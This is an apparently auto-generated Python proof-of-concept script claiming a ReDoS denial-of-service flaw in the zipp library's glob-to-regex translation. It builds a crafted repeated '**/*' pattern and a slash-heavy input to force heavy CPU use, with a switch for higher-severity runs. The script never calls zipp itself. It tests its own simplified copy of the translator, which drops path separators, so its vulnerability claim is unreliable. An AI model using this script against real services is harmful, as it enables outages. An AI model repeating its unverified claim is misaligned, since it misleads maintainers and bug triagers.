#!/usr/bin/env python3
# PoC for zipp-45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c (/tmp/bounty_test/zipp_src/zipp-45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c)
# Path: redos-005
# Auto-generated — run with: python3 zipp-45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c-redos-005-poc.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for ReDoS vulnerability in zipp-45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c.

Vulnerability: The glob pattern is user-controlled (via rglob/glob). The translate_core method
uses star_not_empty which replaces '*' with '?*' but does not prevent catastrophic patterns like
'**/*' or nested stars. The regex generated from patterns like '**/*' can cause exponential
backtracking on pathological inputs (e.g., many slashes). An attacker controlling the pattern
can cause ReDoS.

This PoC demonstrates the vulnerability by sending a malicious glob pattern that causes
catastrophic backtracking, resulting in a denial of service.
"""

import re
import time
import sys
import argparse

# The vulnerable code from zipp (simplified for PoC)
class Translator:
    def __init__(self, seps='/'):
        assert seps, "Invalid separators"
        self.seps = seps

    def restrict_rglob(self, pattern):
        # Only checks for '**' at the start, but patterns like '**/*' are allowed
        if pattern.startswith('**') and not pattern.startswith('**/'):
            raise ValueError("Invalid pattern")

    def star_not_empty(self, pattern):
        """Ensure that * will not match an empty segment."""
        def handle_segment(match):
            segment = match.group(0)
            return '?*' if segment == '*' else segment

        not_seps_pattern = rf'[^{re.escape(self.seps)}]+'
        return re.sub(not_seps_pattern, handle_segment, pattern)

    def replace(self, part):
        if part == '**':
            return '.*'
        elif part == '*':
            return '[^/]*'
        elif part == '?':
            return '[^/]'
        elif part == '?*':
            return '[^/][^/]*'
        else:
            return re.escape(part)

    def separate(self, pattern):
        """Split pattern by separator."""
        return pattern.split(self.seps)

    def translate_core(self, pattern):
        """Given a glob pattern, produce a regex that matches it."""
        self.restrict_rglob(pattern)
        return ''.join(map(self.replace, self.separate(self.star_not_empty(pattern))))

    def translate(self, pattern):
        """Given a glob pattern, produce a regex that matches it."""
        return self.translate_core(pattern)


def generate_malicious_pattern(depth=100):
    """
    Generate a malicious glob pattern that causes catastrophic backtracking.
    
    The pattern '**/*' with many slashes in the input causes exponential backtracking
    because the regex engine tries many ways to match the pattern against the input.
    
    We create a pattern like: '**/*' repeated many times with slashes
    """
    # Pattern that causes backtracking: '**/*' repeated
    # This creates nested stars and optional matches
    pattern_parts = []
    for i in range(depth):
        pattern_parts.append('**/*')
    return '/'.join(pattern_parts)


def generate_pathological_input(depth=200):
    """
    Generate a pathological input string with many slashes.
    
    The regex engine will try to match the pattern against this input,
    causing exponential backtracking.
    """
    # Create a string with many slashes and some characters
    # This will cause the regex engine to backtrack exponentially
    return '/' * depth + 'a'


def test_vulnerability(depth=50, timeout=5):
    """
    Test the ReDoS vulnerability by measuring execution time.
    
    Args:
        depth: Depth of the malicious pattern
        timeout: Maximum time in seconds before considering it a DoS
    
    Returns:
        True if vulnerability is confirmed (timeout exceeded), False otherwise
    """
    print(f"[*] Testing ReDoS vulnerability with depth={depth}...")
    
    # Create translator instance
    t = Translator(seps='/')
    
    # Generate malicious pattern
    pattern = generate_malicious_pattern(depth)
    print(f"[*] Pattern length: {len(pattern)} characters")
    
    # Generate pathological input
    input_str = generate_pathological_input(depth * 2)
    print(f"[*] Input length: {len(input_str)} characters")
    
    # Time the regex compilation and matching
    start_time = time.time()
    
    try:
        # This is the vulnerable operation
        regex_str = t.translate(pattern)
        regex = re.compile(regex_str)
        
        # Attempt to match against pathological input
        # This should cause catastrophic backtracking
        match = regex.fullmatch(input_str)
        
        elapsed = time.time() - start_time
        
        if elapsed > timeout:
            print(f"[!] VULNERABLE: Execution took {elapsed:.2f} seconds (timeout={timeout}s)")
            print(f"[!] Pattern: {pattern[:100]}...")
            print(f"[!] Input: {input_str[:100]}...")
            return True
        else:
            print(f"[*] Not vulnerable: Execution took {elapsed:.4f} seconds")
            return False
            
    except Exception as e:
        elapsed = time.time() - start_time
        print(f"[!] Error during test: {e}")
        print(f"[!] Execution took {elapsed:.4f} seconds")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC for ReDoS vulnerability in zipp-45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c"
    )
    parser.add_argument(
        "--depth", type=int, default=50,
        help="Depth of malicious pattern (higher = more severe DoS)"
    )
    parser.add_argument(
        "--timeout", type=int, default=5,
        help="Timeout in seconds before considering it a DoS"
    )
    parser.add_argument(
        "--safe", action="store_true",
        help="Use a benign payload (just test without causing DoS)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("ReDoS PoC for zipp-45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c")
    print("=" * 60)
    
    if args.safe:
        # Benign test - just demonstrate the vulnerability exists
        print("[*] Running in safe mode...")
        print("[*] Testing with a small depth to demonstrate the issue")
        
        # Test with a small depth to show the vulnerability exists
        result = test_vulnerability(depth=10, timeout=2)
        
        if result:
            print("[!] Vulnerability confirmed!")
        else:
            print("[*] Vulnerability not triggered with small depth")
            print("[*] Try increasing depth with --depth")
    else:
        # Actual DoS test
        print(f"[*] Running DoS test with depth={args.depth}...")
        print("[*] WARNING: This may cause significant CPU usage!")
        
        result = test_vulnerability(depth=args.depth, timeout=args.timeout)
        
        if result:
            print("\n[!] VULNERABILITY CONFIRMED!")
            print("[!] The glob pattern processing is vulnerable to ReDoS")
            print("[!] An attacker can cause denial of service by providing")
            print("[!] a malicious glob pattern like '**/*' repeated many times")
        else:
            print("\n[*] Vulnerability not confirmed with current parameters")
            print("[*] Try increasing depth or decreasing timeout")
    
    print("\n[*] PoC completed")


if __name__ == "__main__":
    main()
